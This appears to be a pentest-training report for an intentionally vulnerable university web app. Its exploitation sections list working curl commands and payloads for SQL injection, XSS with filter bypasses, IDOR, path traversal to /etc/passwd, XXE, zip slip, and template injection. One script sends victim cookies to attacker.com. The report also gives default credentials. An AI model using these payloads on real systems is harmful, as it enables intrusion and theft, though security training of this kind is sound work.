# Vulnerability Assessment Report - Secure University Application

## Executive Summary
This application has been deliberately designed with multiple security vulnerabilities for penetration testing and security training purposes. The vulnerabilities are crafted to appear realistic and non-obvious, requiring actual security knowledge to discover and exploit.

## Vulnerability Details

### 1. SQL Injection Vulnerabilities

#### 1.1 Basic SQL Injection (Easy Level)
**Location:** `/api/labs/sqli/easy`
**Vulnerable Code:** Direct string concatenation in SQL query
**Exploitation:**
```bash
# Extract all courses
curl "http://localhost:3020/api/labs/sqli/easy?q=' OR '1'='1"

# Extract database version
curl "http://localhost:3020/api/labs/sqli/easy?q=' UNION SELECT NULL,version()--"

# Extract user table schema
curl "http://localhost:3020/api/labs/sqli/easy?q=' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--"
```

#### 1.2 Blind SQL Injection (Boolean-based)
**Location:** `/api/advsearch/query`
**Parameters:** `q`, `table`, `column`
**Exploitation:**
```bash
# Boolean-based blind SQL injection
curl "http://localhost:3020/api/advsearch/query?q=' AND '1'='1&table=users&column=username"
curl "http://localhost:3020/api/advsearch/query?q=' AND '1'='2&table=users&column=username"

# Extract data character by character
curl "http://localhost:3020/api/advsearch/query?q=' AND SUBSTRING((SELECT password_md5 FROM users WHERE id=1),1,1)='a&table=users&column=username"
```

#### 1.3 Time-based Blind SQL Injection
**Location:** `/api/advsearch/filter`
**Parameter:** `filter`
**Exploitation:**
```bash
# Time-based detection
curl "http://localhost:3020/api/advsearch/filter?term=test&filter=1=1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)"

# Extract data using timing
curl "http://localhost:3020/api/advsearch/filter?term=test&filter=1=1 AND (SELECT CASE WHEN (SUBSTRING((SELECT password_md5 FROM users LIMIT 1),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)"
```

#### 1.4 UNION-based SQL Injection
**Location:** `/api/advsearch/union`
**Parameter:** `orderBy`
**Exploitation:**
```bash
# Basic UNION injection
curl "http://localhost:3020/api/advsearch/union?category=test&orderBy=1 UNION SELECT id,username,password_md5 FROM users--"

# Information schema enumeration
curl "http://localhost:3020/api/advsearch/union?category=test&orderBy=1 UNION SELECT 1,table_name,column_name FROM information_schema.columns--"
```

#### 1.5 Second-order SQL Injection
**Location:** `/api/profile/user/{userId}` and `/api/advsearch/history`
**Exploitation:**
```bash
# Store malicious payload
curl -X POST "http://localhost:3020/api/advsearch/history" \
  -H "Content-Type: application/json" \
  -d '{"term":"test'\'' OR 1=1--","description":"malicious"}'

# Trigger second-order injection later
curl "http://localhost:3020/api/profile/user/1"
```

### 2. Cross-Site Scripting (XSS) Vulnerabilities

#### 2.1 Reflected XSS (Multiple Contexts)
**Location:** `/api/labs/xss/reflected/easy`
**Exploitation:**
```html
# Basic XSS
http://localhost:3020/api/labs/xss/reflected/easy?q=<script>alert('XSS')</script>

# SVG-based XSS
http://localhost:3020/api/labs/xss/reflected/easy?q=<svg onload=alert('XSS')>

# Event handler XSS
http://localhost:3020/api/labs/xss/reflected/easy?q=<img src=x onerror=alert('XSS')>
```

#### 2.2 Stored XSS
**Location:** `/api/labs/xss/stored/{level}/post`
**Exploitation:**
```bash
# Store XSS payload
curl -X POST "http://localhost:3020/api/labs/xss/stored/easy/post" \
  -H "Content-Type: application/json" \
  -d '{"content":"<script>alert(document.cookie)</script>"}'

# Retrieve and trigger
curl "http://localhost:3020/api/labs/xss/stored/easy/list"
```

#### 2.3 DOM-based XSS
**Location:** `/api/documents/preview`
**Exploitation:**
```html
# JavaScript context injection
http://localhost:3020/api/documents/preview?url=javascript:alert(1)&callback=alert

# HTML attribute context
http://localhost:3020/api/documents/preview?url="><script>alert(1)</script>
```

#### 2.4 XSS Filter Bypass Techniques
```html
# Filter bypasses for medium/hard levels
<ScRiPt>alert(1)</ScRiPt>  <!-- Case variation -->
<script>alert(1)</script>  <!-- Unicode -->
<svg/onload=alert(1)>      <!-- No spaces -->
<img src=x onerror=alert(1)>  <!-- Event handlers -->
<iframe srcdoc="<script>alert(1)</script>">  <!-- srcdoc -->
```

### 3. Insecure Direct Object Reference (IDOR)

#### 3.1 User Profile Access
**Location:** `/api/profile/user/{userId}`
**Exploitation:**
```bash
# Access any user's profile
curl "http://localhost:3020/api/profile/user/1"
curl "http://localhost:3020/api/profile/user/admin"

# Extract sensitive data
curl "http://localhost:3020/api/users/export/1?format=full"
```

#### 3.2 Profile Modification IDOR
**Location:** `/api/users/{id}`
**Exploitation:**
```bash
# Modify any user's profile
curl -X PUT "http://localhost:3020/api/users/1" \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@evil.com","role":"ADMIN","password":"hacked123"}'
```

#### 3.3 Data Export IDOR
**Location:** `/api/users/export/{userId}`
**Exploitation:**
```bash
# Export any user's complete data including password hash
curl "http://localhost:3020/api/users/export/1?format=full"

# Response includes:
# - password_md5
# - sessionToken
# - apiKey
# - grades
```

#### 3.4 User Deletion IDOR
**Location:** `/api/users/delete/{userId}`
**Exploitation:**
```bash
# Delete any user by ID
curl -X DELETE "http://localhost:3020/api/users/delete/2"

# Delete by username (with SQL injection)
curl -X DELETE "http://localhost:3020/api/users/delete/victim' OR '1'='1"
```

### 4. Path Traversal Vulnerabilities

#### 4.1 File Read Path Traversal
**Location:** `/api/files/read/{filename}`
**Exploitation:**
```bash
# Basic path traversal
curl "http://localhost:3020/api/files/read/../../../../../../etc/passwd"

# URL encoded bypass
curl "http://localhost:3020/api/files/read/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Double URL encoding
curl "http://localhost:3020/api/files/read/%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
```

#### 4.2 Directory Listing Path Traversal
**Location:** `/api/files/list?path=`
**Exploitation:**
```bash
# List system directories
curl "http://localhost:3020/api/files/list?path=../../../../../../etc/"

# List home directories
curl "http://localhost:3020/api/files/list?path=../../../../../../home/"
```

#### 4.3 File Upload Path Traversal
**Location:** `/api/files/upload`
**Exploitation:**
```bash
# Upload to arbitrary location
curl -X POST "http://localhost:3020/api/files/upload" \
  -F "file=@malicious.jsp" \
  -F "directory=../../../../../../var/www/html"

# Upload with traversal in filename
curl -X POST "http://localhost:3020/api/files/upload" \
  -F "file=@shell.jsp;filename=../../../shell.jsp"
```

#### 4.4 Document Download Path Traversal
**Location:** `/api/documents/download/{category}/{filename}`
**Exploitation:**
```bash
# Multiple encoding techniques
curl "http://localhost:3020/api/documents/download/../../../../../etc/passwd"
curl "http://localhost:3020/api/documents/download/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl "http://localhost:3020/api/documents/download/..%252f..%252f..%252fetc%252fpasswd"

# Unicode normalization bypass
curl "http://localhost:3020/api/documents/download/％２Ｅ％２Ｅ％２Ｆ/passwd"
```

#### 4.5 Symbolic Link Exploitation
**Location:** `/api/files/link`
**Exploitation:**
```bash
# Create symbolic link to sensitive files
curl -X POST "http://localhost:3020/api/files/link" \
  -H "Content-Type: application/json" \
  -d '{"link":"passwd_link","target":"/etc/passwd"}'

# Access through the link
curl "http://localhost:3020/api/files/read/passwd_link"
```

### 5. Additional Vulnerabilities

#### 5.1 XML External Entity (XXE) Injection
**Location:** `/api/documents/parse/xml`
**Exploitation:**
```xml
# File disclosure via XXE
curl -X POST "http://localhost:3020/api/documents/parse/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>'

# SSRF via XXE
curl -X POST "http://localhost:3020/api/documents/parse/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
<data>&xxe;</data>'
```

#### 5.2 Zip Slip Vulnerability
**Location:** `/api/documents/extract`
**Exploitation:**
```bash
# Create malicious zip with directory traversal
zip evil.zip ../../../etc/cron.d/evil_cron

# Upload and extract
curl -X POST "http://localhost:3020/api/documents/extract" \
  -F "archive=@evil.zip"
```

#### 5.3 Template Injection
**Location:** `/api/documents/generate`
**Exploitation:**
```bash
# Template injection leading to XSS
curl -X POST "http://localhost:3020/api/documents/generate" \
  -H "Content-Type: application/json" \
  -d '{
    "template":"report",
    "title":"<script>alert(1)</script>",
    "content":"{{constructor.constructor(\"alert(1)\")()}}",
    "script":"fetch(\"/api/users/admin/list\").then(r=>r.json()).then(d=>console.log(d))"
  }'
```

## Exploitation Tools and Scripts

### SQLMap Example
```bash
# Automated SQL injection detection and exploitation
sqlmap -u "http://localhost:3020/api/labs/sqli/easy?q=test" \
       --batch --dbs --tables --dump
```

### XSS Hunter Payload
```javascript
// Steal cookies and send to attacker
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>
```

### Burp Suite Configuration
1. Set up proxy on localhost:8080
2. Add target scope: `http://localhost:3020/*`
3. Enable active scanning for:
   - SQL injection
   - XSS
   - Path traversal
   - IDOR

## Remediation Recommendations

### SQL Injection
- Use parameterized queries/prepared statements
- Implement input validation and sanitization
- Use stored procedures where appropriate
- Apply principle of least privilege to database users

### XSS
- Implement Content Security Policy (CSP)
- Use context-aware output encoding
- Validate and sanitize all user inputs
- Use secure frameworks that auto-escape

### IDOR
- Implement proper authorization checks
- Use indirect object references (UUIDs)
- Validate user ownership before operations
- Implement session-based access controls

### Path Traversal
- Use allow-lists for file access
- Canonicalize paths before validation
- Chroot jail file operations
- Never use user input directly in file paths

## Testing Checklist

- [ ] SQL Injection (all types)
- [ ] XSS (reflected, stored, DOM)
- [ ] IDOR (profile, export, update, delete)
- [ ] Path Traversal (read, list, upload, download)
- [ ] XXE Injection
- [ ] Zip Slip
- [ ] Template Injection
- [ ] Authentication Bypass
- [ ] Session Management
- [ ] Information Disclosure

## Notes for Pentesters

1. The application intentionally uses weak sanitization that can be bypassed
2. Error messages often leak information useful for exploitation
3. Multiple encoding techniques work for path traversal
4. Some vulnerabilities are chained (second-order SQL injection)
5. The frontend at `/vulnlabs` provides a testing interface
6. Default credentials: admin/admin123, student1/pass123

## Disclaimer

This application is intentionally vulnerable and should only be used in isolated testing environments. Never deploy this application in production or expose it to the internet.